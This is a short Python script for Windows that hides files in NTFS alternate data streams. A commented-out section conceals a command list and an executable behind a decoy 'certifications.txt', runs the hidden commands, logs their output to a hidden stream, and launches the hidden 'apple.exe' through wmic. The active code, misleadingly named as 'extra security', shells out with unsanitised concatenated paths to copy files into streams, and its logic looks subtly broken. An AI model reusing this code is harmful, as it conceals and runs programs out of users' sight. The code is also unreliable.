
# import os,subprocess

# def buildADSFilename(filename,streamname):
#     path = os.getcwd() +"\\"
#     subprocess.run("type "+ path + streamname +" > " + path + filename+":"+streamname, shell=True)
#     return filename+":"+streamname

# decoy = "certifications.txt"
# # resultfile = buildADSFilename(decoy,"results.txt")
# # commandfile = buildADSFilename(decoy,"commands.txt")
# # # Run commands from file
# # with open(commandfile,"r") as c:
# #     for line in c:
# #         str(os.system(line + " >> " + resultfile))

# # Run executable
# exefile = "apple.exe"
# exepath = os.path.join(os.getcwd(),buildADSFilename(decoy,exefile))
# print(exepath)
# os.system("wmic process call create "+exepath)


import os,win32api,shutil,subprocess,fnmatch

def providing_extra_security():
    ext_file_path = []
    file_path_li = []
    get_alldrives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
    for i in get_alldrives:
        try:
            for root,subdir,files in os.walk(os.getcwd()):
                for file in files:
                    filepath = os.path.join(root,file)
                    file_path_li.append(filepath)
                    try:
                        for i in range(2):
                            filepath_ext = os.path.join(filepath + str(i))
                            if fnmatch.fnmatch(filepath_ext, '*.*' + str(i)):
                                ext_file_path.append(filepath_ext)  
                    except:
                        pass
        except:
            pass
    return file_path_li,ext_file_path

def add_more(file_path_li,ext_file_path):
    i = 1
    try:
        for file,ext_file in zip(file_path_li,ext_file_path):
            for i in range(2):
                if fnmatch.fnmatch(ext_file, '*.*' + str(i)):
                    subprocess.Popen("cmd.exe -command type " + ext_file +" > " + file +":"+os.path.basename(ext_file),shell=True) 
    except:
        pass
                    
if __name__ == "__main__":
    file_path_li,ext_file_path =providing_extra_security()
    add_more(file_path_li,ext_file_path)